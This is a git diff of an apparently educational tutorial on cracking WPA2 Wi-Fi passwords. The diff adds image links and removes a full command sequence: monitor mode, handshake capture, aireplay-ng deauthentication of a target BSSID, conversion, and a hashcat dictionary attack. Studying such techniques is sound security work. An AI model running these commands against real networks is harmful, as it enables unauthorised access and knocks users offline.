@@ -123,58 +123,17 @@ aircrack-ng -w [wordlist.txt] -b [BSSID] capture_wpa2-01.cap
 - `-w [wordlist.txt]`: Path to your dictionary file (e.g., `rockyou.txt`).
 - `-b [BSSID]`: The target network’s MAC address.
 - `capture_wpa2-01.cap`: The file containing the captured handshake.
+![Setup](Images/aircrack_com.png)
+
+
 
 #### Wait for the Results
 If the password is in the wordlist, `aircrack-ng` will reveal it. If not, you may need a more extensive wordlist or other cracking techniques.
+
+![Setup](Images/aircrack.png)
+
 
 ---
 
 
 
-<pre lang="markdown">
-sudo apt install aircrack-ng hashcat -y
-</pre>
-
-<pre lang="markdown">
-ifconfig
-</pre>
-
-<pre lang="markdown">
-/sbin/ifconfig
-</pre>
-
-<pre lang="markdown">
-sudo airmon-ng start wlp3s0
-</pre>
-
-<pre lang="markdown">
-sudo airodump-ng wlp3s0mon
-</pre>
-
-<pre lang="markdown">
-sudo airodump-ng --bssid 00:11:22:33:44:55 -c 10 --write capture wlp3s0mon
-</pre>
-
-<pre lang="markdown">
-sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlp3s0mon
-</pre>
-
-<pre lang="markdown">
-gcc cap2hccapx.c -o cap2hccapx
-</pre>
-
-<pre lang="markdown">
-./cap2hccapx capture-01.cap capture.hccapx
-</pre>
-
-<pre lang="markdown">
-hashcat -I
-</pre>
-
-<pre lang="markdown">
-hashcat -m 2500 capture.hccapx dictionary.txt
-</pre>
-
-<pre lang="markdown">
-hashcat -m 2500 capture.hccapx dictionary.txt --show
-</pre>
